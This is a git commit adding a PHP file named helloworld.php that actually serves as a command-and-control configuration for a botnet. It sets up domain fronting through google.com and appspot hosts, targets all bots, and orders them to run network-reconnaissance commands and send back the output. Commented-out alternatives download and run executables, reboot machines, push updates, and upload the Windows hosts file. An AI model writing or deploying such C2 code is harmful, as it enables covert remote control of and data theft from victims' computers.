4541b9df975cee5d5669c5c9baf76cb53b2c12f1
haveano <cezary.wysocki+github@gmail.com>
2018-10-05 12:00:04 +0200

    Add files via upload

---
+++ domain2/helloworld.php
@@ -0,0 +1,39 @@
+<?php
+
+//echo 'Hello, World!';
+//echo "reald1=domain2-196908.appspot.com;\n";
+//echo "frontd1=google.com;\n";
+echo "post_d1=php-post-server-195907.appspot.com;\n";
+echo "post_d1_url=post.php;\n";
+echo "front_get_d1=google.com;\n";
+echo "get_d1=php-post-server-195907.appspot.com;\n";
+echo "interval=55;\n";
+echo "config_v=20;\n";
+#echo "bots=w3y3murw1cf;\n";
+echo "bots=_all_;\n";
+#echo "bots=;";
+#
+#echo "command=dl_i_run;\n";
+//ponizszy plik trzeba wrzucic na domene get_d1
+#echo "command_arg=putty.exe;\n";
+#
+#echo "command=download;\n";
+//ponizszy plik trzeba wrzucic na domene "get_d1":
+#echo "command_arg=putty.exe;\n";
+#
+echo "command=cmd_comm_run_wait_i_send;\n";
+echo "command_arg=/C_(ipconfig_/all_&_route_print);\n";
+
+#echo "command=cmd_comm_run_i_exit;\n";
+#echo "command_arg=/C_putty.exe_-load_1;\n";
+#
+#echo "command=reboot;\n";
+#echo "command_arg=;\n";
+#
+#echo "command=update;\n";
+#echo "command_arg=hl204.exe;\n";
+#echo "command=upload;\n";
+#echo "command_arg=c:\\\\Windows\\\\system32\\\\drivers\\\\etc\\\\hosts;\n";
+
+?>
+
